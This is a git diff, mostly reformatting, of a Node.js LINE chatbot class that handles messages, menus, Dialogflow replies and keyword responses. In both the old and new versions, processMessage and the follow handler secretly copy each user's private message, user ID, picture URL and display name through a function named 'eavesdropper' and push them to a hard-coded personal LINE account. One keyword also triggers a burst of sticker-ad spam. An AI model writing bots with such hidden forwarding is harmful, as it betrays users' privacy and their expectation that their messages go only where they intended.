@@ -14,246 +14,231 @@ let shutup = 0;
 
 module.exports = class LineBot {
 
-  get apiaiService() {
-    return this._apiaiService;
-  }
+    get apiaiService() {
+        return this._apiaiService;
+    }
 
-  set apiaiService(value) {
-    this._apiaiService = value;
-  }
+    set apiaiService(value) {
+        this._apiaiService = value;
+    }
 
-  get botConfig() {
-    return this._botConfig;
-  }
+    get botConfig() {
+        return this._botConfig;
+    }
 
-  set botConfig(value) {
-    this._botConfig = value;
-  }
+    set botConfig(value) {
+        this._botConfig = value;
+    }
 
-  get sessionIds() {
-    return this._sessionIds;
-  }
+    get sessionIds() {
+        return this._sessionIds;
+    }
 
-  set sessionIds(value) {
-    this._sessionIds = value;
-  }
+    set sessionIds(value) {
+        this._sessionIds = value;
+    }
 
-  getText(message) {
-    if (message.message && message.message.type === 'text'
-        && message.message.text) {
-      return message.message.text;
-    } else{
+    getText(message) {
+        if (message.message && message.message.type === 'text' &&
+            message.message.text) {
+            return message.message.text;
+        } else {
+            return null;
+        }
+    }
+
+    getChatId(message) {
+        if (message.source) {
+
+            if (message.source.type === 'user') {
+                return message.source.userId;
+            }
+
+            if (message.source.type === 'group') {
+                return message.source.groupId;
+            }
+
+            if (message.source.type === 'room') {
+                return message.source.roomId;
+            }
+        }
         return null;
     }
-  }
 
-  getChatId(message) {
-    if (message.source) {
+    constructor(botConfig) {
+        this._botConfig = botConfig;
+        let apiaiOptions = {
+            language: botConfig.apiaiLang,
+            requestSource: "line"
+        };
 
-      if (message.source.type === 'user') {
-        return message.source.userId;
-      }
-
-      if (message.source.type === 'group') {
-        return message.source.groupId;
-      }
-
-      if (message.source.type === 'room') {
-        return message.source.roomId;
-      }
-    }
-    return null;
-  }
-
-  constructor(botConfig) {
-    this._botConfig = botConfig;
-    let apiaiOptions = {
-      language: botConfig.apiaiLang,
-      requestSource: "line"
-    };
-
-    this._apiaiService = apiai(botConfig.apiaiAccessToken, apiaiOptions);
-    this._sessionIds = new Map();
-    this._sendMessageInterval = 500;
-  }
-
-  processMessage(message, res) {
-    if (this._botConfig.devConfig) {
-      this.log("message", message);
+        this._apiaiService = apiai(botConfig.apiaiAccessToken, apiaiOptions);
+        this._sessionIds = new Map();
+        this._sendMessageInterval = 500;
     }
 
-    let chatId = this.getChatId(message);
-    var messageText = this.getText(message);
-    if(message.source.groupId == undefined){
-      this.getProfile(chatId)
-      .then((profiledata) => {
-        // console.log(data);
-        console.log('user says : ' + messageText);
-        const data = JSON.parse(profiledata);
-        const liyomessage = eroFunction.eavesdropper(data.userId, data.pictureUrl, data.displayName, messageText)
-        this.replyPush('U506c7426ba192e705210a874b97b40ca',[liyomessage]);
-      })
-    }
-
-    if (chatId && messageText) {
-
-      if (messageText) {
-        if (!this._sessionIds.has(chatId)) {
-          this._sessionIds.set(chatId, uuid.v4());
+    processMessage(message, res) {
+        if (this._botConfig.devConfig) {
+            this.log("message", message);
         }
 
-        // ====================local check=============================
-            if(res == null){
-              console.log(err);
-              console.log('event null');
+        let chatId = this.getChatId(message);
+        var messageText = this.getText(message);
+        if (message.source.groupId == undefined) {
+            this.getProfile(chatId)
+                .then((profiledata) => {
+                    // console.log(data);
+                    console.log('user says : ' + messageText);
+                    const data = JSON.parse(profiledata);
+                    const liyomessage = eroFunction.eavesdropper(data.userId, data.pictureUrl, data.displayName, messageText)
+                    this.replyPush('U506c7426ba192e705210a874b97b40ca', [liyomessage]);
+                })
+        }
+
+        if (chatId && messageText) {
+
+            if (messageText) {
+                if (!this._sessionIds.has(chatId)) {
+                    this._sessionIds.set(chatId, uuid.v4());
+                }
+
+                // ====================local check=============================
+                if (res == null) {
+                    console.log(err);
+                    console.log('event null');
+                }
+                if (res != null) {
+                    this.PUBG(message, 0).then((value) => {
+                            console.log(value);
+                            if (value == 0) {
+                                console.log("I'm in");
+                                let apiaiRequest = this._apiaiService.textRequest(messageText, {
+                                    sessionId: this._sessionIds.get(chatId)
+                                });
+
+                                apiaiRequest.on('response', (response) => {
+
+                                    let action = response.result.action;
+
+                                    this.processAiResponse(chatId, response, message.replyToken)
+                                        .then(() => this.log('Message sent'))
+                                        .catch((err) => this.logError(err))
+                                });
+
+                                apiaiRequest.on('error', (error) => console.error(error));
+                                apiaiRequest.end();
+                            } else {
+                                console.log("Oh no");
+                                return this.reply(message.replyToken, [value]);
+                            }
+                        })
+                        .catch(err => console.log(err));
+                }
+                // });
+
+                // mongo.eventLog(message,(err, res) => {
+                //   console.log('event log');
+                // });
+
+            } else {
+                this.log('Empty message 2 ');
             }
-            if(res != null){
-            this.PUBG(message,0).then((value) => {
-              console.log(value);
-                if(value == 0){
-                      console.log("I'm in");
-                      let apiaiRequest = this._apiaiService.textRequest(messageText,{
-                      sessionId: this._sessionIds.get(chatId)
-                    });
-
-                    apiaiRequest.on('response', (response) => {
-
-                    let action = response.result.action;
-
-                    this.processAiResponse(chatId, response, message.replyToken)
-                        .then(() => this.log('Message sent'))
-                        .catch((err) => this.logError(err))
-                    });
-
-                    apiaiRequest.on('error', (error) => console.error(error));
-                    apiaiRequest.end();
-              }else{
-                console.log("Oh no");
-                return this.reply(message.replyToken, [value]);
-              }
-            })
-            .catch(err => console.log(err));
-          }
-        // });
-
-        // mongo.eventLog(message,(err, res) => {
-        //   console.log('event log');
-        // });
-
-      }
-      else {
-        this.log('Empty message 2 ');
-      }
-    } else {
+        } else {
             //return this.reply(message.replyToken, [confirm]);
-      if(message.message.type == "sticker"){
-        // const messages = {
-        //     "type": "image",
-        //     "originalContentUrl": "https://i.imgur.com/rrKM5HZ.png",
-        //     "previewImageUrl": "https://i.imgur.com/xBhVsZS.png"
-        // };
-        // return this.reply(message.replyToken, [messages]);
-      }else if(message.message.type == "image"){
-        // const messages = {
-        //   type: "text",
-        //   text: "請不要隨便傳垃圾訊息 大撒B"
-        // };
-        // return this.reply(message.replyToken, [messages]);
-      }
-      this.log('Empty message 3 ');
+            if (message.message.type == "sticker") {
+                // const messages = {
+                //     "type": "image",
+                //     "originalContentUrl": "https://i.imgur.com/rrKM5HZ.png",
+                //     "previewImageUrl": "https://i.imgur.com/xBhVsZS.png"
+                // };
+                // return this.reply(message.replyToken, [messages]);
+            } else if (message.message.type == "image") {
+                // const messages = {
+                //   type: "text",
+                //   text: "請不要隨便傳垃圾訊息 大撒B"
+                // };
+                // return this.reply(message.replyToken, [messages]);
+            }
+            this.log('Empty message 3 ');
+        }
     }
-  }
     // ====================================================================================================
-  processPostback(postback,res){
+    processPostback(postback, res) {
         if (this._botConfig.devConfig) {
             this.log("message", postback);
         }
 
         let chatId = this.getChatId(postback);
         //let messageText = postback.postback.params.datetime;
-        if (postback.type === 'follow'){  //點級圖片 換
-          eroPicture.eroMenuList(this.botConfig.channelAccessToken,0)
-          .then((richMenuId) => {
-            eroPicture.linkUser(this.botConfig.channelAccessToken,"richmenu-0338d622b3ab7520414d1c7d7afafefe",postback.source.userId);
-          });
-          // change menu notify
-          //
-          this.getProfile(postback.source.userId)
-          .then((profiledata) => {
-            const data = JSON.parse(profiledata);
-            const messageText = "change Menu";
-            const liyomessage = eroFunction.eavesdropper(data.userId, data.pictureUrl, data.displayName, messageText)
-            this.replyPush('U506c7426ba192e705210a874b97b40ca',[liyomessage]);
-          })
-        }// =============== Layer 1
-        else if (postback.postback.data === `action=news`){
-          const confirm = bnreply.cubeeNews();
-          return this.reply(postback.replyToken, [confirm]);
-        }
-        else if (postback.postback.data === `action=food`){
-          const confirm = bnreply.cubeeFood();
-          return this.reply(postback.replyToken, [confirm]);
-        }
-        else if (postback.postback.data === `action=shop`){
-          const confirm = bnreply.cubeeShop();
-          return this.reply(postback.replyToken, [confirm]);
-        }
-        else if (postback.postback.data === `action=gossip`){
-          const confirm = bnreply.cubeeGossip();
-          return this.reply(postback.replyToken, [confirm]);
-        }
-        else if (postback.postback.data === `action=ticket`){
-          const confirm = bnreply.cubeeTicket();
-          return this.reply(postback.replyToken, [confirm]);
-        }
-        else if (postback.postback.data === `action=tour`){
-          const confirm = bnreply.cubeeTour();
-          return this.reply(postback.replyToken, [confirm]);
+        if (postback.type === 'follow') { //點級圖片 換
+            eroPicture.eroMenuList(this.botConfig.channelAccessToken, 0)
+                .then((richMenuId) => {
+                    eroPicture.linkUser(this.botConfig.channelAccessToken, "richmenu-0338d622b3ab7520414d1c7d7afafefe", postback.source.userId);
+                });
+            // change menu notify
+            //
+            this.getProfile(postback.source.userId)
+                .then((profiledata) => {
+                    const data = JSON.parse(profiledata);
+                    const messageText = "change Menu";
+                    const liyomessage = eroFunction.eavesdropper(data.userId, data.pictureUrl, data.displayName, messageText)
+                    this.replyPush('U506c7426ba192e705210a874b97b40ca', [liyomessage]);
+                })
+        } // =============== Layer 1
+        else if (postback.postback.data === `action=news`) {
+            const confirm = bnreply.cubeeNews();
+            return this.reply(postback.replyToken, [confirm]);
+        } else if (postback.postback.data === `action=food`) {
+            const confirm = bnreply.cubeeFood();
+            return this.reply(postback.replyToken, [confirm]);
+        } else if (postback.postback.data === `action=shop`) {
+            const confirm = bnreply.cubeeShop();
+            return this.reply(postback.replyToken, [confirm]);
+        } else if (postback.postback.data === `action=gossip`) {
+            const confirm = bnreply.cubeeGossip();
+            return this.reply(postback.replyToken, [confirm]);
+        } else if (postback.postback.data === `action=ticket`) {
+            const confirm = bnreply.cubeeTicket();
+            return this.reply(postback.replyToken, [confirm]);
+        } else if (postback.postback.data === `action=tour`) {
+            const confirm = bnreply.cubeeTour();
+            return this.reply(postback.replyToken, [confirm]);
         }
         //================= Layer 2
-        else if(postback.postback.data === 'action=globalNews'){
-          const confirm = bnreply.cubeeBusinessNews();
-          return this.reply(postback.replyToken, [confirm]);
+        else if (postback.postback.data === 'action=globalNews') {
+            const confirm = bnreply.cubeeBusinessNews();
+            return this.reply(postback.replyToken, [confirm]);
+        } else if (postback.postback.data === 'action=focusNews') {
+            const confirm = bnreply.cubeeBusinessNews();
+            return this.reply(postback.replyToken, [confirm]);
+        } else if (postback.postback.data === 'action=businessNews') {
+            const confirm = bnreply.cubeeBusinessNews();
+            return this.reply(postback.replyToken, [confirm]);
+        } else if (postback.postback.data === 'action=societyNews') {
+            const confirm = bnreply.cubeeBusinessNews();
+            return this.reply(postback.replyToken, [confirm]);
+        } else if (postback.postback.data === 'action=techNews') {
+            const confirm = bnreply.cubeeBusinessNews();
+            return this.reply(postback.replyToken, [confirm]);
+        } else if (postback.postback.data === 'action=headlineNews') {
+            const confirm = bnreply.cubeeBusinessNews();
+            return this.reply(postback.replyToken, [confirm]);
+        } else if (postback.postback.data === 'action=tourNews') {
+            const confirm = bnreply.cubeeBusinessNews();
+            return this.reply(postback.replyToken, [confirm]);
+        } else if (postback.postback.data === 'action=entertainmentNews') {
+            const confirm = bnreply.cubeeFood();
+            return this.reply(postback.replyToken, [confirm]);
+        } else if (postback.postback.data === 'action=trafficNews') {
+            const confirm = bnreply.cubeeBusinessNews();
+            return this.reply(postback.replyToken, [confirm]);
+        } else if (postback.postback.data === 'action=sportNews') {
+            const confirm = bnreply.cubeeBusinessNews();
+            return this.reply(postback.replyToken, [confirm]);
         }
-        else if(postback.postback.data === 'action=focusNews'){
-          const confirm = bnreply.cubeeBusinessNews();
-          return this.reply(postback.replyToken, [confirm]);
-        }
-        else if(postback.postback.data === 'action=businessNews'){
-          const confirm = bnreply.cubeeBusinessNews();
-          return this.reply(postback.replyToken, [confirm]);
-        }
-        else if(postback.postback.data === 'action=societyNews'){
-          const confirm = bnreply.cubeeBusinessNews();
-          return this.reply(postback.replyToken, [confirm]);
-        }
-        else if(postback.postback.data === 'action=techNews'){
-          const confirm = bnreply.cubeeBusinessNews();
-          return this.reply(postback.replyToken, [confirm]);
-        }
-        else if(postback.postback.data === 'action=headlineNews'){
-          const confirm = bnreply.cubeeBusinessNews();
-          return this.reply(postback.replyToken, [confirm]);
-        }
-        else if(postback.postback.data === 'action=tourNews'){
-          const confirm = bnreply.cubeeBusinessNews();
-          return this.reply(postback.replyToken, [confirm]);
-        }
-        else if(postback.postback.data === 'action=entertainmentNews'){
-          const confirm = bnreply.cubeeFood();
-          return this.reply(postback.replyToken, [confirm]);
-        }
-        else if(postback.postback.data === 'action=trafficNews'){
-          const confirm = bnreply.cubeeBusinessNews();
-          return this.reply(postback.replyToken, [confirm]);
-        }
-        else if(postback.postback.data === 'action=sportNews'){
-          const confirm = bnreply.cubeeBusinessNews();
-          return this.reply(postback.replyToken, [confirm]);
-        }
-  }
+    }
     // ====================================================================================================
-  processAiResponse(chatId, apiaiResponse,replyToken) {
+    processAiResponse(chatId, apiaiResponse, replyToken) {
         let responseText = apiaiResponse.result.fulfillment.speech;
         let responseData = apiaiResponse.result.fulfillment.data;
         let messages = apiaiResponse.result.fulfillment.messages;
@@ -268,7 +253,7 @@ module.exports = class LineBot {
         if (this.isDefined(messages) && (messages.length == 1 && messages[0].type == 0)) {
             console.log("first if");
             let timeoutInterval = 1100;
-            let previousType ;
+            let previousType;
             let cardTypes = [];
             let timeout = 0;
             for (var i = 0; i < messages.length; i++) {
@@ -276,25 +261,25 @@ module.exports = class LineBot {
                 previousType = messages[i].type;
 
             }
-            if(action != "input.unknown"){
-              const message = {
-                type: "text",
-                text: responseText
-              };
-              return this.reply(replyToken, [message]);
+            if (action != "input.unknown") {
+                const message = {
+                    type: "text",
+                    text: responseText
+                };
+                return this.reply(replyToken, [message]);
             } else {
-              return Promise.resolve(0);
+                return Promise.resolve(0);
             }
-        } else if (messages.length > 1){
+        } else if (messages.length > 1) {
             var ran = messages[Math.floor(Math.random() * messages.length)];
-            if(ran.type == 0){
-              const message = {
-                  type: "text",
-                  text: ran.speech
-              };
-              return this.reply(replyToken, [message]);
-            }else{
-              return this.reply(replyToken, [ran.payload]);
+            if (ran.type == 0) {
+                const message = {
+                    type: "text",
+                    text: ran.speech
+                };
+                return this.reply(replyToken, [message]);
+            } else {
+                return this.reply(replyToken, [ran.payload]);
             }
         } else if (messages[0].type != 0 || !this.isDefined(action)) {
             console.log("sec if");
@@ -310,486 +295,483 @@ module.exports = class LineBot {
             };
             return this.reply(replyToken, [message]);
         }
-  }
+    }
 
     // ====================================================================================================
 
-  handleApiAiAction(replyToken, action, responseText, contexts, messages) {
-      console.log(action);
-      const message = {
-        type: "text",
-        text: responseText
-      };
-      return this.reply(replyToken, [message]);
-  }
-
-  convertToLineMessages(responseMessages) {
-    try {
-
-      const lineMessages = [];
-
-      for (let messageIndex = 0; messageIndex < responseMessages.length;
-          messageIndex++) {
-        let message = responseMessages[messageIndex];
-
-        switch (message.type) {
-          case 0:
-            if (message.speech) {
-              let lineMessage = {
-                type: "text",
-                text: message.speech
-              };
-              lineMessages.push(lineMessage);
-            }
-            break;
-          case 1: {
-            let lineMessage = {
-              type: "template",
-              altText: "Cards are not supported in this client",
-              template: {
-                type: "buttons"
-              }
-            };
-
-            if (message.title) {
-              lineMessage.template.title = message.title;
-            }
-
-            if (message.subtitle) {
-              lineMessage.template.text = message.subtitle;
-            } else {
-              lineMessage.template.text = message.title;
-              delete lineMessage.template.title;
-            }
-
-            if (message.imageUrl) {
-              lineMessage.template.thumbnailImageUrl = message.imageUrl;
-            }
-
-            if (message.buttons.length > 0) {
-              let actions = [];
-              for (let buttonIndex = 0; buttonIndex < message.buttons.length;
-                  buttonIndex++) {
-                let button = message.buttons[buttonIndex];
-                let text = button.text;
-                let postback = button.postback;
-
-                if (text) {
-
-                  if (!postback) {
-                    postback = text;
-                  }
-
-                  if (postback.startsWith('http')) {
-                    actions.push({
-                      type: "uri",
-                      label: text,
-                      uri: postback
-                    });
-                  } else {
-                    actions.push({
-                      type: "postback",
-                      label: text,
-                      data: postback,
-                      text: postback
-                    });
-                  }
-                }
-              }
-
-              if (actions.length > 0 && lineMessage.template.text) {
-                lineMessage.template.actions = actions;
-                lineMessages.push(lineMessage);
-              }
-            }
-          }
-            break;
-          case 2: {
-            let lineMessage = {
-              type: "template",
-              altText: "Cards are not supported in this client",
-              template: {
-                type: "buttons"
-              }
-            };
-            lineMessage.template.text = message.title ? message.title
-                : 'Choose an item';
-
-            let actions = [];
-            for (let replyIndex = 0; replyIndex < message.replies.length;
-                replyIndex++) {
-              let actionText = message.replies[replyIndex];
-              actions.push({
-                type: "postback",
-                label: actionText,
-                data: actionText,
-                text: actionText
-              });
-            }
-
-            if (actions.length > 0) {
-              lineMessage.template.actions = actions;
-              lineMessages.push(lineMessage);
-            }
-          }
-            break;
-          case 3: {
-            if (message.imageUrl) {
-              let lineMessage =
-                  {
-                    type: "image",
-                    originalContentUrl: message.imageUrl,
-                    previewImageUrl: message.imageUrl
-                  };
-
-              lineMessages.push(lineMessage);
-            }
-          }
-            break;
-          case 4:
-            if (message.payload && message.payload.line) {
-              lineMessages.push(message.payload.line);
-            }
-            break;
-          default:
-            break;
-        }
-      }
-
-      return lineMessages;
-    } catch (err) {
-      return [];
+    handleApiAiAction(replyToken, action, responseText, contexts, messages) {
+        console.log(action);
+        const message = {
+            type: "text",
+            text: responseText
+        };
+        return this.reply(replyToken, [message]);
     }
-  }
 
-  replyWithMessages(chatId, replyToken, lineMessages) {
-    if (lineMessages && lineMessages.length > 0) {
+    convertToLineMessages(responseMessages) {
+        try {
 
-      if (lineMessages.length <= 5) {
-        // Line reply limit
-        return this.reply(replyToken, lineMessages);
-      } else {
+            const lineMessages = [];
+
+            for (let messageIndex = 0; messageIndex < responseMessages.length; messageIndex++) {
+                let message = responseMessages[messageIndex];
+
+                switch (message.type) {
+                    case 0:
+                        if (message.speech) {
+                            let lineMessage = {
+                                type: "text",
+                                text: message.speech
+                            };
+                            lineMessages.push(lineMessage);
+                        }
+                        break;
+                    case 1:
+                        {
+                            let lineMessage = {
+                                type: "template",
+                                altText: "Cards are not supported in this client",
+                                template: {
+                                    type: "buttons"
+                                }
+                            };
+
+                            if (message.title) {
+                                lineMessage.template.title = message.title;
+                            }
+
+                            if (message.subtitle) {
+                                lineMessage.template.text = message.subtitle;
+                            } else {
+                                lineMessage.template.text = message.title;
+                                delete lineMessage.template.title;
+                            }
+
+                            if (message.imageUrl) {
+                                lineMessage.template.thumbnailImageUrl = message.imageUrl;
+                            }
+
+                            if (message.buttons.length > 0) {
+                                let actions = [];
+                                for (let buttonIndex = 0; buttonIndex < message.buttons.length; buttonIndex++) {
+                                    let button = message.buttons[buttonIndex];
+                                    let text = button.text;
+                                    let postback = button.postback;
+
+                                    if (text) {
+
+                                        if (!postback) {
+                                            postback = text;
+                                        }
+
+                                        if (postback.startsWith('http')) {
+                                            actions.push({
+                                                type: "uri",
+                                                label: text,
+                                                uri: postback
+                                            });
+                                        } else {
+                                            actions.push({
+                                                type: "postback",
+                                                label: text,
+                                                data: postback,
+                                                text: postback
+                                            });
+                                        }
+                                    }
+                                }
+
+                                if (actions.length > 0 && lineMessage.template.text) {
+                                    lineMessage.template.actions = actions;
+                                    lineMessages.push(lineMessage);
+                                }
+                            }
+                        }
+                        break;
+                    case 2:
+                        {
+                            let lineMessage = {
+                                type: "template",
+                                altText: "Cards are not supported in this client",
+                                template: {
+                                    type: "buttons"
+                                }
+                            };
+                            lineMessage.template.text = message.title ? message.title :
+                                'Choose an item';
+
+                            let actions = [];
+                            for (let replyIndex = 0; replyIndex < message.replies.length; replyIndex++) {
+                                let actionText = message.replies[replyIndex];
+                                actions.push({
+                                    type: "postback",
+                                    label: actionText,
+                                    data: actionText,
+                                    text: actionText
+                                });
+                            }
+
+                            if (actions.length > 0) {
+                                lineMessage.template.actions = actions;
+                                lineMessages.push(lineMessage);
+                            }
+                        }
+                        break;
+                    case 3:
+                        {
+                            if (message.imageUrl) {
+                                let lineMessage = {
+                                    type: "image",
+                                    originalContentUrl: message.imageUrl,
+                                    previewImageUrl: message.imageUrl
+                                };
+
+                                lineMessages.push(lineMessage);
+                            }
+                        }
+                        break;
+                    case 4:
+                        if (message.payload && message.payload.line) {
+                            lineMessages.push(message.payload.line);
+                        }
+                        break;
+                    default:
+                        break;
+                }
+            }
+
+            return lineMessages;
+        } catch (err) {
+            return [];
+        }
+    }
+
+    replyWithMessages(chatId, replyToken, lineMessages) {
+        if (lineMessages && lineMessages.length > 0) {
+
+            if (lineMessages.length <= 5) {
+                // Line reply limit
+                return this.reply(replyToken, lineMessages);
+            } else {
+                return new Promise((resolve, reject) => {
+                    async.eachSeries(lineMessages, (msg, callback) => {
+
+                        Promise.resolve()
+                            .then(() => this.replyPush(chatId, [msg]))
+                            .then(() => this.sleep(this._sendMessageInterval))
+                            .then(() => callback())
+                            .catch(err => callback(err));
+
+                    }, (err) => {
+                        if (err) {
+                            this.logError(err);
+                            reject(err);
+                        } else {
+                            resolve();
+                        }
+                    });
+                });
+            }
+        } else {
+            return Promise.resolve();
+        }
+    }
+
+    reply(replyToken, messages) {
+        console.log("reply in " + messages);
         return new Promise((resolve, reject) => {
-          async.eachSeries(lineMessages, (msg, callback) => {
+            request.post("https://api.line.me/v2/bot/message/reply", {
+                forever: true,
+                headers: {
+                    'Authorization': `Bearer ${this.botConfig.channelAccessToken}`
+                },
+                json: {
+                    replyToken: replyToken,
+                    messages: messages
+                }
+            }, (error, response, body) => {
+                if (error) {
+                    this.logError('Error while sending message', error);
+                    reject(error);
+                    return;
+                }
 
-            Promise.resolve()
-                .then(() => this.replyPush(chatId, [msg]))
-                .then(() => this.sleep(this._sendMessageInterval))
-                .then(() => callback())
-                .catch(err => callback(err));
+                if (response.statusCode !== 200) {
+                    this.logError('Error status code while sending message', body);
+                    reject(error);
+                    return;
+                }
 
-          }, (err) => {
-            if (err) {
-              this.logError(err);
-              reject(err);
-            } else {
-              resolve();
-            }
-          });
+                this.log('Send message succeeded');
+                resolve(body);
+            });
         });
-      }
-    } else {
-      return Promise.resolve();
-    }
-  }
-
-  reply(replyToken, messages) {
-    console.log("reply in " + messages);
-    return new Promise((resolve, reject) => {
-      request.post("https://api.line.me/v2/bot/message/reply", {
-        forever: true,
-        headers: {
-          'Authorization': `Bearer ${this.botConfig.channelAccessToken}`
-        },
-        json: {
-          replyToken: replyToken,
-          messages: messages
-        }
-      }, (error, response, body) => {
-        if (error) {
-          this.logError('Error while sending message', error);
-          reject(error);
-          return;
-        }
-
-        if (response.statusCode !== 200) {
-          this.logError('Error status code while sending message', body);
-          reject(error);
-          return;
-        }
-
-        this.log('Send message succeeded');
-        resolve(body);
-      });
-    });
-  }
-
-  replyPush(receiverId, messages) {
-    console.log("liyo hack");
-    return new Promise((resolve, reject) => {
-      request.post("https://api.line.me/v2/bot/message/push", {
-        forever: true,
-        headers: {
-          'Authorization': `Bearer ${this.botConfig.channelAccessToken}`
-        },
-        json: {
-          to: receiverId,
-          messages: messages
-        }
-      }, (error, response, body) => {
-        if (error) {
-          this.logError('Error while sending message', error);
-          reject(error);
-          return;
-        }
-
-        if (response.statusCode !== 200) {
-          this.logError('Error status code while sending message', body);
-          reject(error);
-          return;
-        }
-
-        this.log('Send message succeeded');
-        resolve(body);
-      });
-    });
-  }
-
-  getProfile(userid) {
-    console.log("fuckin user =" + userid);
-    return new Promise((resolve, reject) => {
-      request.get(`https://api.line.me/v2/bot/profile/${userid}` , {
-        headers: {
-          'Authorization': `Bearer ${this.botConfig.channelAccessToken}`
-        }
-      }, (error, response, body) => {
-        if (error) {
-          this.logError('Error while sending message', error);
-          reject(error);
-          return;
-        }
-
-        if (response.statusCode !== 200) {
-          this.logError('Error status code while sending message', body);
-          reject(error);
-          return;
-        }
-
-        this.log('Send message succeeded');
-        resolve(body);
-      });
-    });
-  }
-
-  filterPlatformMessages(messages, platform) {
-    if (messages) {
-      let platformMessages = messages.filter(m => m.platform === platform);
-      if (platformMessages.length === 0) {
-        platformMessages = messages.filter(m => !this.isDefined(m.platform));
-      }
-      return platformMessages;
-    } else {
-      return [];
-    }
-  }
-
-  sleep(delay) {
-    return new Promise((resolve, reject) => {
-      setTimeout(() => resolve(), delay);
-    });
-  }
-
-  log() {
-    let args = Array.prototype.slice.call(arguments);
-    console.log.apply(console, args);
-  }
-
-  logError() {
-    let args = Array.prototype.slice.call(arguments);
-    console.error.apply(console, args);
-  }
-
-  isDefined(obj) {
-    if (typeof obj === 'undefined') {
-      return false;
     }
 
-    if (!obj) {
-      return false;
-    }
-
-    return obj !== null;
-  }
-
-  wrongphone(message){
-    mongo.updateStatus(message.source.userId, 1, (err, res) => {
-      if(err) console.log(err);
-      else console.log(res);
-    });
-
-    return bnreply.askphonereply();
-  }
-
-
-  PUBG(message,status){
-    //return Promise.resolve(0)
-    if(message.message.text === "Cubee 安安"){
-      const confirm = bnreply.cubee(); // end confirm
-      return Promise.resolve(confirm);
-    }else if((message.message.text.indexOf('TaxiGo') != -1)){
-      const confirm = {
-        type: "text",
-        text: "TaxiGo 我兄弟啦 "
-      };
-      const pushConfirm = {
-        type: "text",
-        text: "找我兄弟不如買我們的貼圖  https://line.me/S/sticker/3998963"
-      };
-      this.replyPush(message.source.groupId || message.source.userId, [pushConfirm]);
-      const pushConfirm1 = {
-        type: "text",
-        text: "找我兄弟不如買我們的貼圖  https://line.me/S/sticker/4357617"
-      };
-      this.replyPush(message.source.groupId || message.source.userId, [pushConfirm1]);
-      const pushConfirm2 = {
-        type: "text",
-        text: "找我兄弟不如買我們的貼圖  https://line.me/S/sticker/3998963"
-      };
-      this.replyPush(message.source.groupId || message.source.userId, [pushConfirm2]);
-      const pushConfirm3 = {
-        type: "text",
-        text: "找我兄弟不如買我們的貼圖  https://line.me/S/sticker/4212262"
-      };
-      this.replyPush(message.source.groupId | message.source.userId, [pushConfirm3]);
-      const pushConfirm4 = {
-        type: "text",
-        text: "找我兄弟不如買我們的貼圖  https://line.me/S/sticker/4212262"
-      };
-      this.replyPush(message.source.groupId || message.source.userId, [pushConfirm4]);
-      const pushConfirm5 = {
-        type: "text",
-        text: "找我兄弟不如買我們的貼圖  https://line.me/S/sticker/3662781"
-      };
-      this.replyPush(message.source.groupId || message.source.userId, [pushConfirm5]);
-      const pushConfirm6 = {
-        type: "text",
-        text: "找我兄弟不如買我們的貼圖 https://line.me/S/sticker/4212408"
-      };
-      this.replyPush(message.source.groupId || message.source.userId, [pushConfirm6]);
-      return Promise.resolve(confirm);
-    }
-    if(message.message.text === "BlueNet功能 敬請期待" || message.message.text === "BN 測試 #####"){
-
-      return Promise.resolve(eroFunction.chooseMenu());
-    }else if(message.message.text === "查詢" ){
-      const confirm = {
-        type: "text",
-        text: "your line userid = " + message.source.userId
-      }; // end confirm
-      return Promise.resolve(confirm);
-    }else if( ((message.message.text.indexOf('台北') != -1) && (message.message.text.indexOf('捷運') != -1)) || (message.message.text.indexOf('北捷') != -1) ){
-      const confirm = {
-        "type": "image",
-        "originalContentUrl": "https://i.imgur.com/oJBhOG4.jpg",
-        "previewImageUrl": "https://i.imgur.com/oJBhOG4.jpg"
-      }; // end confirm
-      return Promise.resolve(confirm);
-    }else if( ((message.message.text.indexOf('高雄') != -1) && (message.message.text.indexOf('捷運') != -1)) || (message.message.text.indexOf('高捷') != -1) ){
-      const confirm = {
-        "type": "image",
-        "originalContentUrl": "https://i.imgur.com/jAyj5vY.jpg",
-        "previewImageUrl": "https://i.imgur.com/jAyj5vY.jpg"
-      }; // end confirm
-      return Promise.resolve(confirm);
-    }else if((message.message.text.indexOf('捷運') != -1)){
-      const confirm = {
-        "type": "template",
-        "altText": "Ask MRT template",
-        "template": {
-            "type": "buttons",
-            "thumbnailImageUrl": "https://www.bluenet-ride.com/images/drawable/cubeegroup/surprisecubee.png",
-            "imageAspectRatio": "rectangle",
-            "imageSize": "cover",
-            "imageBackgroundColor": "#4898AF",
-            "title": "搭捷運嗎 ?",
-            "text": "您要台北捷運還是高雄捷運呢 ?",
-            "defaultAction": {
-                "type": "uri",
-                "label": "View detail",
-                "uri": "http://example.com/page/123"
-            },
-            "actions": [
-                {
-                  "type": "message",
-                  "label": "北捷",
-                  "text": "北捷"
+    replyPush(receiverId, messages) {
+        console.log("liyo hack");
+        return new Promise((resolve, reject) => {
+            request.post("https://api.line.me/v2/bot/message/push", {
+                forever: true,
+                headers: {
+                    'Authorization': `Bearer ${this.botConfig.channelAccessToken}`
                 },
-                {
-                  "type": "message",
-                  "label": "高捷",
-                  "text": "高捷"
+                json: {
+                    to: receiverId,
+                    messages: messages
                 }
-            ]
-        }
-      }; // end confirm
-      return Promise.resolve(confirm);
-    }else if (message.message.text === "老鐵回家了"){
-      return Promise.resolve(eroFunction.selftest());
-    }else if ((message.message.text.indexOf('開始時間') != -1) && (message.message.text.indexOf('結束時間') != -1) && (message.message.text.indexOf('活動地點') != -1)) {
-      var index = {
-        start : message.message.text.indexOf('開始時間'),
-        end : message.message.text.indexOf('結束時間'),
-        location : message.message.text.indexOf('活動地點'),
-        content : message.message.text.indexOf('活動內容')
-      }
-      var start = message.message.text.slice(index.start + 5, index.end);
-      var end = message.message.text.slice(index.end + 5, index.location);
-      var title = message.message.text.slice(0, index.start);
-      var location = message.message.text.slice(index.location + 5, index.content);
+            }, (error, response, body) => {
+                if (error) {
+                    this.logError('Error while sending message', error);
+                    reject(error);
+                    return;
+                }
 
-      const confirm = {
-        "type": "template",
-        "altText": "cubee詢問是否加進日曆",
-        "template": {
-            "type": "confirm",
-            "text": "要加進日曆嗎?",
-            "actions": [
-                {
-                   "type":"uri",
-                   "label":"Yes",
-                   "uri":`http://bn-calendar.herokuapp.com?title=${message.message.text.slice(0, index.start)}&start=${message.message.text.slice(index.start + 5, index.end)}&end=${message.message.text.slice(index.end + 5, index.location)}&location=${message.message.text.slice(index.location + 5, index.content)}`
-                },
-                {
-                  "type": "postback",
-                  "label": "No",
-                  "data": "action=no"
+                if (response.statusCode !== 200) {
+                    this.logError('Error status code while sending message', body);
+                    reject(error);
+                    return;
                 }
-            ]
-        }
-      }
